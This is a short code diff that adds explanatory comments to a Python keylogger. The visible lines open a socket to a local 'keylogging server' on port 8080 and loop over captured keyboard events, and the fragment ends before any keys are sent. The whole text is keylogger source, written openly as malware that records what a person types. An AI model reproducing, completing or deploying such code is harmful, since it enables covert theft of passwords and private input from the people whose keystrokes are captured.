@@ -3,11 +3,12 @@
 import keyboard
 import socket
 
+# create a socket connection to the keylogging server
 s = socket.socket()  
 port = 8080
 s.connect(('127.0.0.1', port)) 
 
-
+# constantly loop through all the characters and check if they are currently being pressed or not
 while True:
     rk = keyboard.read_event()
     key = rk.name
